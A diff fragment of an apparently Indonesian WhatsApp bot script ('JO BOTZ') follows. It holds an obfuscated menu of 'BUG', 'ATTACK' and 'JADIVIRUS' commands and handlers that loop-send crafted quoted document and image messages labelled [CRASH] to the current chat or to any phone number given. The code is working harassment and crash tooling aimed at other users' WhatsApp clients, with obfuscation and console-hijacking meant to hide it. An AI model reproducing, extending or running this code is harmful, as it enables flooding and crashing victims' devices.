_0x4b2324=_0x100604['constructor']['prototype'][_0xa7d926(0x143)](_0x100604),_0x4d534e=_0x1d1a04[_0x33a396],_0x225b12=_0x1db607[_0x4d534e]||_0x4b2324;_0x4b2324[_0xa7d926(0x17f)]=_0x100604['bind'](_0x100604),_0x4b2324[_0xa7d926(0x180)]=_0x225b12[_0xa7d926(0x180)][_0xa7d926(0x143)](_0x225b12),_0x1db607[_0x4d534e]=_0x4b2324;}});_0x3d8a83();{if(!isCreator&&!isBan)return;anu='\x0a\x20╔╦╗╦─╦╔╗─╦╔╗╦╗╔╗╔╦╗\x0a\x20─║─╠═╣╠──║║║║╣║║─║\x0a\x20─╩─╩─╩╚╝╚╝╚╝╩╝╚╝─╩\x0a╭━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━╮\x0a┃╭┈─────────────⩵꙰ཱི࿐\x0a┃╰──\x20⏤͟͟͞BUG\x20NYA\x20──➤\x20↶↷\x0a╰━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›〘\x20BUG\x20MENU\x20〙\x0a│➳\x20'+prefix+_0x15a6dc(0x158)+prefix+_0x15a6dc(0x12a)+prefix+_0x15a6dc(0x144)+prefix+_0x15a6dc(0x17e)+prefix+_0x15a6dc(0x18d)+prefix+_0x15a6dc(0x114)+prefix+_0x15a6dc(0x10c)+prefix+'jodocu\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x173)+prefix+_0x15a6dc(0x131)+prefix+_0x15a6dc(0x183)+prefix+_0x15a6dc(0x15f)+prefix+_0x15a6dc(0x125)+prefix+_0x15a6dc(0x118)+prefix+_0x15a6dc(0x122)+prefix+_0x15a6dc(0x10d)+prefix+_0x15a6dc(0x16f)+prefix+_0x15a6dc(0x12d)+prefix+_0x15a6dc(0x14e)+prefix+_0x15a6dc(0x15b)+prefix+'kintil\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x15c)+prefix+_0x15a6dc(0x11b)+prefix+'kuntul\x20(jumlah)\x0a│➳\x20'+prefix+'johello\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x16a)+prefix+_0x15a6dc(0x14f)+prefix+_0x15a6dc(0x148)+prefix+_0x15a6dc(0x14d)+prefix+_0x15a6dc(0x150)+prefix+_0x15a6dc(0x115)+prefix+_0x15a6dc(0x153)+prefix+'jobugpc\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x179)+prefix+'joliveloc\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x17d)+prefix+'jobutton\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x141)+prefix+'crashcok\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x155)+prefix+_0x15a6dc(0x15e)+prefix+_0x15a6dc(0x170)+prefix+_0x15a6dc(0x169)+prefix+_0x15a6dc(0x13b)+prefix+_0x15a6dc(0x110)+prefix+_0x15a6dc(0x184)+prefix+_0x15a6dc(0x187)+prefix+'jocatalogv2\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x181)+prefix+_0x15a6dc(0x172)+prefix+'jobugbutton\x20(jumlah)\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›〘\x20ATTACK\x20MENU\x20〙\x0a│➳\x20'+prefix+_0x15a6dc(0x111)+prefix+_0x15a6dc(0x11f)+prefix+_0x15a6dc(0x167)+prefix+_0x15a6dc(0x147)+prefix+'josendbug5\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x160)+prefix+_0x15a6dc(0x138)+prefix+_0x15a6dc(0x166)+prefix+'josendbug9\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x13a)+prefix+_0x15a6dc(0x165)+prefix+_0x15a6dc(0x18a)+prefix+_0x15a6dc(0x11c)+prefix+_0x15a6dc(0x119)+prefix+_0x15a6dc(0x16c)+prefix+_0x15a6dc(0x18c)+prefix+_0x15a6dc(0x116)+prefix+'jotrolito\x20(Nomer)\x0a│➳\x20'+prefix+_0x15a6dc(0x17a)+prefix+_0x15a6dc(0x13c)+prefix+_0x15a6dc(0x16e)+prefix+_0x15a6dc(0x12e)+prefix+'jomomoto\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x129)+prefix+_0x15a6dc(0x161)+prefix+'jobuttonto\x20(Nomer)\x0a│➳\x20'+prefix+_0x15a6dc(0x117)+prefix+_0x15a6dc(0x177)+prefix+_0x15a6dc(0x14c)+prefix+'jotengkorakto\x20(Nomer)\x20\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›\x20〘\x20ATTACK2\x20MENU\x20〙\x0a│➳\x20'+prefix+'jogasbug1\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x15d)+prefix+_0x15a6dc(0x12c)+prefix+_0x15a6dc(0x11e)+prefix+_0x15a6dc(0x10e)+prefix+_0x15a6dc(0x12f)+prefix+'jogasbug7\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x16b)+prefix+_0x15a6dc(0x157)+prefix+_0x15a6dc(0x140)+prefix+_0x15a6dc(0x156)+prefix+_0x15a6dc(0x164)+prefix+_0x15a6dc(0x113)+prefix+_0x15a6dc(0x128)+prefix+_0x15a6dc(0x188)+prefix+_0x15a6dc(0x133)+prefix+_0x15a6dc(0x146)+prefix+'jogashello\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x139)+prefix+_0x15a6dc(0x132)+prefix+'jogasmomo\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x142)+prefix+_0x15a6dc(0x186)+prefix+_0x15a6dc(0x171)+prefix+'jogasbutton\x20(Nomer)\x0a│➳\x20'+prefix+_0x15a6dc(0x135)+prefix+_0x15a6dc(0x112)+prefix+'polling\x20(Teks)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x17b)+prefix+_0x15a6dc(0x11a)+prefix+_0x15a6dc(0x182)+prefix+_0x15a6dc(0x152)+prefix+_0x15a6dc(0x174)+prefix+'tobugstik\x20(Reply\x20Image)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x159)+prefix+_0x15a6dc(0x162)+prefix+_0x15a6dc(0x151)+prefix+_0x15a6dc(0x137)+prefix+_0x15a6dc(0x130)+prefix+_0x15a6dc(0x163)+prefix+_0x15a6dc(0x16d)+prefix+_0x15a6dc(0x18b)+prefix+'jadikontol\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x123)+prefix+_0x15a6dc(0x17c)+prefix+_0x15a6dc(0x13f)+prefix+'jadibuttonimg\x20(ReplyImage\x20|\x20Teks)\x20\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a\x0a©\x20⏤͟͟͞𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁\x0a',jobotz[_0x15a6dc(0x176)](m['chat'],{'image':{'url':_0x15a6dc(0x149)},'contextInfo':{'externalAdReply':{'title':_0x15a6dc(0x134),'body':_0x15a6dc(0x10a)+runtime(process['uptime']()),'previewType':_0x15a6dc(0x10f),'showAdAttribution':!![],'sourceUrl':_0x15a6dc(0x120),'thumbnailUrl':_0x15a6dc(0x149)}},'caption':anu});}
+function _0x2db8(){var _0x30036a=['josendbug6\x20(Nomer)\x20\x0a│➳\x20','joinfiniteto\x20(Nomer)\x20\x0a│➳\x20','jadibugdoc\x20(Reply\x20Media)\x20\x0a│➳\x20','jadidarkness\x20(Reply\x20Media)\x20\x0a│➳\x20','jogasbug12\x20(Nomer)\x20\x0a│➳\x20','josendbug11\x20(Nomer)\x20\x0a│➳\x20','josendbug8\x20(Nomer)\x20\x0a│➳\x20','josendbug3\x20(Nomer)\x20\x0a│➳\x20','console','jothelima\x20(jumlah)\x0a│➳\x20','jolokas\x20(jumlah)\x0a│➳\x20','jogasbug8\x20(Nomer)\x20\x0a│➳\x20','jobutto\x20(Nomer)\x20\x0a│➳\x20','jadikintil\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20','johelloto\x20(Nomer)\x0a│➳\x20','jobug9\x20(jumlah)\x0a│➳\x20','jobugstik\x20(jumlah)\x0a│➳\x20','jogasliveloc\x20(Nomer)\x0a│➳\x20','jotengkorak\x20(jumlah)\x0a│➳\x20','jobug1\x20(jumlah)\x0a│➳\x20','jadibugbutton\x20(Teks)\x20\x0a│➳\x20','4825818uRJFHE','sendMessage','jobugdocto\x20(Nomer)\x0a│➳\x20','39075bSlHRh','jobugvn\x20(jumlah)\x0a│➳\x20','kontolto\x20(Nomer)\x0a│➳\x20','jaditroli\x20(Teks)\x20\x0a│➳\x20','jadiliveloc\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20','jobuglist\x20(jumlah)\x0a│➳\x20','josantet\x0a│➳\x20','__proto__','toString','jobuttonbro\x20(jumlah)\x0a│➳\x20','jadilokas\x20(Teks)\x20\x0a│➳\x20','jobug3\x20(jumlah)\x0a│➳\x20','jobuginvite\x20(jumlah)\x0a│➳\x20','info','jogasinfinite\x20(Nomer)\x20\x0a│➳\x20','jobugstikv2\x20(jumlah)\x0a│➳\x20','jogaspay\x20(Nomer)\x20\x0a│➳\x20','18Zhizdn','josendbug12\x20(Nomer)\x20\x0a│➳\x20','jadikuntul\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20','jostikto\x20(Nomer)\x20\x0a│➳\x20','joinfinite\x0a│➳\x20','warn','Runtime\x20','apply','jopay\x20(jumlah)\x0a│➳\x20','jobug8\x20(jumlah)\x0a│➳\x20','jogasbug5\x20(Nomer)\x20\x0a│➳\x20','PHOTO','jolivelocv2\x20(jumlah)\x0a│➳\x20','josendbug1\x20(Nomer)\x20\x0a│➳\x20','jogastengkorak\x20(Nomer)\x20\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›〘\x20JADIVIRUS\x20MENU\x20〙\x0a│➳\x20','jogasvn\x20(Nomer)\x20\x0a│➳\x20','joslebew\x0a│➳\x20','monyet\x20(jumlah)\x0a│➳\x20','jopayto\x20(Nomer)\x20\x0a│➳\x20','jolivelocto\x20(Nomer)\x0a│➳\x20','jobug6\x20(jumlah)\x0a│➳\x20','kintilto\x20(Nomer)\x0a│➳\x20','jadipeler\x20(Teks)\x20\x0a│➳\x20','kontol\x20(jumlah)\x0a│➳\x20','jovnto\x20(Nomer)\x20\x0a│➳\x20','exception','jogasbug4\x20(Nomer)\x20\x0a│➳\x20','josendbug2\x20(Nomer)\x20\x0a│➳\x20','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','228674mbpTqU','jobug7\x20(jumlah)\x0a│➳\x20','jadibugloc\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20','720714oYXjVg','jobug5\x20(jumlah)\x0a│➳\x20','trace','(((.+)+)+)+$','jogasstik\x20(Nomer)\x20\x0a│➳\x20','jobuglocto\x20(Nomer)\x0a│➳\x20','bokep\x0a│➳\x20','3000464wduIoI','jogasbug3\x20(Nomer)\x20\x0a│➳\x20','jobug10\x20(jumlah)\x0a│➳\x20','josantetto\x20(Nomer)\x20\x0a│➳\x20','jogasbug6\x20(Nomer)\x20\x0a│➳\x20','jadingeness\x20(Reply\x20Media)\x20\x0a│➳\x20','jobug2\x20(jumlah)\x0a│➳\x20','jogaskuntul\x20(Nomer)\x0a│➳\x20','jogastroli\x20(Nomer)\x0a│➳\x20','©⏤͟͟͞𝐓𝐇𝐄\x20𝐉𝐎\x20𝐁𝐎𝐓','jogasbugloc\x20(Nomer)\x0a│➳\x20','{}.constructor(\x22return\x20this\x22)(\x20)','jadijoness\x20(Reply\x20Media)\x20\x0a│➳\x20','josendbug7\x20(Nomer)\x20\x0a│➳\x20','jogaskintol\x20(Nomer)\x0a│➳\x20','josendbug10\x20(Nomer)\x20\x0a│➳\x20','jobugdoc\x20(jumlah)\x0a│➳\x20','kuntulto\x20(Nomer)\x0a│➳\x20','length','constructor','jadicatalog\x20(ReplyImage\x20|\x20Teks)\x20\x0a│➳\x20','jogasbug10\x20(Nomer)\x20\x0a│➳\x20','jobugloc\x20(jumlah)\x0a│➳\x20','jogassantet\x20(Nomer)\x20\x0a│➳\x20','bind','polvot\x0a│➳\x20','36rmDsyS','jogaskintil\x20(Nomer)\x0a│➳\x20','josendbug4\x20(Nomer)\x20\x0a│➳\x20','ngenes\x20(jumlah)\x0a│➳\x20','https://telegra.ph/file/094abb98c63d1fbac703e.jpg','2204720iHlOff','search','jobuginviteto\x20(Nomer)\x0a│➳\x20','darkness\x20(jumlah)\x0a│➳\x20','jobug11\x20(jumlah)\x0a│➳\x20','joness\x20(jumlah)\x0a│➳\x20','buggam\x20(jumlah)\x0a│➳\x20','jadibugstik\x20(Reply\x20Sticker)\x20\x0a│➳\x20','jadimonyet\x20(Teks)\x20\x0a│➳\x20','jomomo\x20(jumlah)\x0a│➳\x20','table','jotagwae\x20(jumlah)\x0a│➳\x20','jogasbug11\x20(Nomer)\x20\x0a│➳\x20','jogasbug9\x20(Nomer)\x20\x0a│➳\x20','poll\x0a│➳\x20','jadibugvn\x20(Reply\x20Audio)\x20\x0a│➳\x20','73199WcGmUu','jobug12\x20(jumlah)\x0a│➳\x20','jotroli\x20(jumlah)\x0a│➳\x20','jogasbug2\x20(Nomer)\x20\x0a│➳\x20','jocatalog\x20(jumlah)\x0a│➳\x20','jobug4\x20(jumlah)\x0a│➳\x20'];_0x2db8=function(){return _0x30036a;};return _0x2db8();}function _0x225d(_0x562681,_0x43cf2e){var _0x5aa0ec=_0x2db8();return _0x225d=function(_0x3d8a83,_0x100604){_0x3d8a83=_0x3d8a83-0x109;var _0xf5a7be=_0x5aa0ec[_0x3d8a83];return _0xf5a7be;},_0x225d(_0x562681,_0x43cf2e);}var _0x15a6dc=_0x225d;(function(_0x4180ce,_0x4781bd){var _0x5eeb76=_0x225d,_0x3b9c31=_0x4180ce();while(!![]){try{var _0xdc47d1=parseInt(_0x5eeb76(0x121))/0x1+-parseInt(_0x5eeb76(0x124))/0x2+-parseInt(_0x5eeb76(0x178))/0x3*(-parseInt(_0x5eeb76(0x145))/0x4)+parseInt(_0x5eeb76(0x14a))/0x5+-parseInt(_0x5eeb76(0x189))/0x6*(parseInt(_0x5eeb76(0x15a))/0x7)+parseInt(_0x5eeb76(0x12b))/0x8+-parseInt(_0x5eeb76(0x175))/0x9;if(_0xdc47d1===_0x4781bd)break;else _0x3b9c31['push'](_0x3b9c31['shift']());}catch(_0x245cfa){_0x3b9c31['push'](_0x3b9c31['shift']());}}}(_0x2db8,0x391f3));var _0x559ff2=(function(){var _0x507e2a=!![];return function(_0x44b050,_0x66f8c5){var _0x5d90f4=_0x507e2a?function(){if(_0x66f8c5){var _0x81ca6b=_0x66f8c5['apply'](_0x44b050,arguments);return _0x66f8c5=null,_0x81ca6b;}}:function(){};return _0x507e2a=![],_0x5d90f4;};}()),_0x2c3f17=_0x559ff2(this,function(){var _0x3fff9d=_0x225d;return _0x2c3f17['toString']()[_0x3fff9d(0x14b)](_0x3fff9d(0x127))[_0x3fff9d(0x180)]()[_0x3fff9d(0x13e)](_0x2c3f17)[_0x3fff9d(0x14b)](_0x3fff9d(0x127));});_0x2c3f17();var _0x100604=(function(){var _0x3f2ba6=!![];return function(_0x4ce18b,_0x5b0343){var _0x4222ce=_0x3f2ba6?function(){var _0x4ea1fd=_0x225d;if(_0x5b0343){var _0x25759d=_0x5b0343[_0x4ea1fd(0x10b)](_0x4ce18b,arguments);return _0x5b0343=null,_0x25759d;}}:function(){};return _0x3f2ba6=![],_0x4222ce;};}()),_0x3d8a83=_0x100604(this,function(){var _0xa7d926=_0x225d,_0x328932;try{var _0x5ebefe=Function('return\x20(function()\x20'+_0xa7d926(0x136)+');');_0x328932=_0x5ebefe();}catch(_0x1ae269){_0x328932=window;}var _0x1db607=_0x328932[_0xa7d926(0x168)]=_0x328932[_0xa7d926(0x168)]||{},_0x1d1a04=['log',_0xa7d926(0x109),_0xa7d926(0x185),'error',_0xa7d926(0x11d),_0xa7d926(0x154),_0xa7d926(0x126)];for(var _0x33a396=0x0;_0x33a396<_0x1d1a04[_0xa7d926(0x13d)];_0x33a396++){var _0x4b2324=_0x100604['constructor']['prototype'][_0xa7d926(0x143)](_0x100604),_0x4d534e=_0x1d1a04[_0x33a396],_0x225b12=_0x1db607[_0x4d534e]||_0x4b2324;_0x4b2324[_0xa7d926(0x17f)]=_0x100604['bind'](_0x100604),_0x4b2324[_0xa7d926(0x180)]=_0x225b12[_0xa7d926(0x180)][_0xa7d926(0x143)](_0x225b12),_0x1db607[_0x4d534e]=_0x4b2324;}});_0x3d8a83();{if(!isCreator&&!isBan)return;anu='\x0a\x20╔╦╗╦─╦╔╗─╦╔╗╦╗╔╗╔╦╗\x0a\x20─║─╠═╣╠──║║║║╣║║─║\x0a\x20─╩─╩─╩╚╝╚╝╚╝╩╝╚╝─╩\x0a╭━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━╮\x0a┃╭┈─────────────⩵꙰ཱི࿐\x0a┃╰──\x20⏤͟͟͞BUG\x20NYA\x20──➤\x20↶↷\x0a╰━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›〘\x20BUG\x20MENU\x20〙\x0a│➳\x20'+prefix+_0x15a6dc(0x158)+prefix+_0x15a6dc(0x12a)+prefix+_0x15a6dc(0x144)+prefix+_0x15a6dc(0x17e)+prefix+_0x15a6dc(0x18d)+prefix+_0x15a6dc(0x114)+prefix+_0x15a6dc(0x10c)+prefix+'jodocu\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x173)+prefix+_0x15a6dc(0x131)+prefix+_0x15a6dc(0x183)+prefix+_0x15a6dc(0x15f)+prefix+_0x15a6dc(0x125)+prefix+_0x15a6dc(0x118)+prefix+_0x15a6dc(0x122)+prefix+_0x15a6dc(0x10d)+prefix+_0x15a6dc(0x16f)+prefix+_0x15a6dc(0x12d)+prefix+_0x15a6dc(0x14e)+prefix+_0x15a6dc(0x15b)+prefix+'kintil\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x15c)+prefix+_0x15a6dc(0x11b)+prefix+'kuntul\x20(jumlah)\x0a│➳\x20'+prefix+'johello\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x16a)+prefix+_0x15a6dc(0x14f)+prefix+_0x15a6dc(0x148)+prefix+_0x15a6dc(0x14d)+prefix+_0x15a6dc(0x150)+prefix+_0x15a6dc(0x115)+prefix+_0x15a6dc(0x153)+prefix+'jobugpc\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x179)+prefix+'joliveloc\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x17d)+prefix+'jobutton\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x141)+prefix+'crashcok\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x155)+prefix+_0x15a6dc(0x15e)+prefix+_0x15a6dc(0x170)+prefix+_0x15a6dc(0x169)+prefix+_0x15a6dc(0x13b)+prefix+_0x15a6dc(0x110)+prefix+_0x15a6dc(0x184)+prefix+_0x15a6dc(0x187)+prefix+'jocatalogv2\x20(jumlah)\x0a│➳\x20'+prefix+_0x15a6dc(0x181)+prefix+_0x15a6dc(0x172)+prefix+'jobugbutton\x20(jumlah)\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›〘\x20ATTACK\x20MENU\x20〙\x0a│➳\x20'+prefix+_0x15a6dc(0x111)+prefix+_0x15a6dc(0x11f)+prefix+_0x15a6dc(0x167)+prefix+_0x15a6dc(0x147)+prefix+'josendbug5\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x160)+prefix+_0x15a6dc(0x138)+prefix+_0x15a6dc(0x166)+prefix+'josendbug9\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x13a)+prefix+_0x15a6dc(0x165)+prefix+_0x15a6dc(0x18a)+prefix+_0x15a6dc(0x11c)+prefix+_0x15a6dc(0x119)+prefix+_0x15a6dc(0x16c)+prefix+_0x15a6dc(0x18c)+prefix+_0x15a6dc(0x116)+prefix+'jotrolito\x20(Nomer)\x0a│➳\x20'+prefix+_0x15a6dc(0x17a)+prefix+_0x15a6dc(0x13c)+prefix+_0x15a6dc(0x16e)+prefix+_0x15a6dc(0x12e)+prefix+'jomomoto\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x129)+prefix+_0x15a6dc(0x161)+prefix+'jobuttonto\x20(Nomer)\x0a│➳\x20'+prefix+_0x15a6dc(0x117)+prefix+_0x15a6dc(0x177)+prefix+_0x15a6dc(0x14c)+prefix+'jotengkorakto\x20(Nomer)\x20\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›\x20〘\x20ATTACK2\x20MENU\x20〙\x0a│➳\x20'+prefix+'jogasbug1\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x15d)+prefix+_0x15a6dc(0x12c)+prefix+_0x15a6dc(0x11e)+prefix+_0x15a6dc(0x10e)+prefix+_0x15a6dc(0x12f)+prefix+'jogasbug7\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x16b)+prefix+_0x15a6dc(0x157)+prefix+_0x15a6dc(0x140)+prefix+_0x15a6dc(0x156)+prefix+_0x15a6dc(0x164)+prefix+_0x15a6dc(0x113)+prefix+_0x15a6dc(0x128)+prefix+_0x15a6dc(0x188)+prefix+_0x15a6dc(0x133)+prefix+_0x15a6dc(0x146)+prefix+'jogashello\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x139)+prefix+_0x15a6dc(0x132)+prefix+'jogasmomo\x20(Nomer)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x142)+prefix+_0x15a6dc(0x186)+prefix+_0x15a6dc(0x171)+prefix+'jogasbutton\x20(Nomer)\x0a│➳\x20'+prefix+_0x15a6dc(0x135)+prefix+_0x15a6dc(0x112)+prefix+'polling\x20(Teks)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x17b)+prefix+_0x15a6dc(0x11a)+prefix+_0x15a6dc(0x182)+prefix+_0x15a6dc(0x152)+prefix+_0x15a6dc(0x174)+prefix+'tobugstik\x20(Reply\x20Image)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x159)+prefix+_0x15a6dc(0x162)+prefix+_0x15a6dc(0x151)+prefix+_0x15a6dc(0x137)+prefix+_0x15a6dc(0x130)+prefix+_0x15a6dc(0x163)+prefix+_0x15a6dc(0x16d)+prefix+_0x15a6dc(0x18b)+prefix+'jadikontol\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20'+prefix+_0x15a6dc(0x123)+prefix+_0x15a6dc(0x17c)+prefix+_0x15a6dc(0x13f)+prefix+'jadibuttonimg\x20(ReplyImage\x20|\x20Teks)\x20\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a\x0a©\x20⏤͟͟͞𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁\x0a',jobotz[_0x15a6dc(0x176)](m['chat'],{'image':{'url':_0x15a6dc(0x149)},'contextInfo':{'externalAdReply':{'title':_0x15a6dc(0x134),'body':_0x15a6dc(0x10a)+runtime(process['uptime']()),'previewType':_0x15a6dc(0x10f),'showAdAttribution':!![],'sourceUrl':_0x15a6dc(0x120),'thumbnailUrl':_0x15a6dc(0x149)}},'caption':anu});}
 }
 break
 
@@ -4196,12 +4196,12 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 documentMessage: {
-title: `By: 𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`, 
+title: `By: 𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
 jpegThumbnail: fs.readFileSync(`./pict.jpg`),
 }
 }
 } 
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fdoc})}
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fdoc})}
 jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 case 'josendbug1':{
@@ -4213,7 +4213,7 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 documentMessage: {
-title: `By: 𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`, 
+title: `By: 𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
 jpegThumbnail: fs.readFileSync(`./pict.jpg`),
 }
 }
@@ -4231,20 +4231,20 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 documentMessage: {
-title: `By: 𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`, 
+title: `By: 𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
 jpegThumbnail: fs.readFileSync(`./pict.jpg`),
 }
 }
 } 
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fdoc1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:fdoc1})
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fdoc1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:fdoc1})
 jancok(`Berhasil Mengirim Bug1 Di Nomer ${text}`)
 break
 case 'jobug2':
 if (!isCreator && !isBan) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku 𝙃𝘼𝙈𝙕`
+ydd = `Hallo Aku JO`
 for (let i = 0; i < jumlah; i++) {
 let foto = { 
 key: { 
@@ -4255,12 +4255,12 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕, 
+"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
 "jpegThumbnail": virgam
 } 
 } 
 }
-jobotz.sendMessage(m.chat, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foto})}
+jobotz.sendMessage(m.chat, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foto})}
 jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
 break
 case 'josendbug2':
@@ -4275,12 +4275,12 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕`, 
+"caption": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁`, 
 "jpegThumbnail": virgam
 } 
 } 
 }
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝙏𝙃𝙀 𝙃𝘼𝙈𝙕 𝘽𝙊𝙏𝙕 [CRASH]"},{quoted:foto})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁 [CRASH]"},{quoted:foto})
 await m.reply(`Berhasil Mengirim Bug2 Di Nomer ${text}`)
 break
 case 'jogasbug2':
@@ -4295,13 +4295,13 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
